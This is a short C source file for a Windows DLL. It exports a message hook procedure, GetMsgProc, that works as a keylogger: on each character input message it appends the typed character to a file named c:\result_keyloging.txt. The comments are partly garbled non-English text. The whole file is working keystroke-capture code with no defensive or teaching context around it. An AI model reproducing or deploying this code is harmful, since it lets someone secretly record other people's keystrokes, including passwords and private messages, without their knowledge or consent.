#include <windows.h>

__declspec(dllexport) LRESULT CALLBACK GetMsgProc(INT nCode, WPARAM wp, LPARAM lp)
{
    if(((MSG*)lp)->message == (long)WM_CHAR) // ���� �Է� �޼����� ��� 
    {                         
		HANDLE hFile;
		DWORD dwWrite;

		// 1. open file
		hFile = CreateFile("c:\\result_keyloging.txt", GENERIC_WRITE, 0, NULL, OPEN_ALWAYS,
			FILE_ATTRIBUTE_NORMAL, NULL);        
		
		// 2. move fp to end
		SetFilePointer(hFile, 0, 0, FILE_END);
		
		// 3. write to file
		WriteFile(hFile, &((MSG*)lp)->wParam, 1, &dwWrite, NULL); // ���ڴ� lp->wParam�� �����
		
		// 4. close file
		CloseHandle(hFile);                                
    }
    return TRUE;  
}

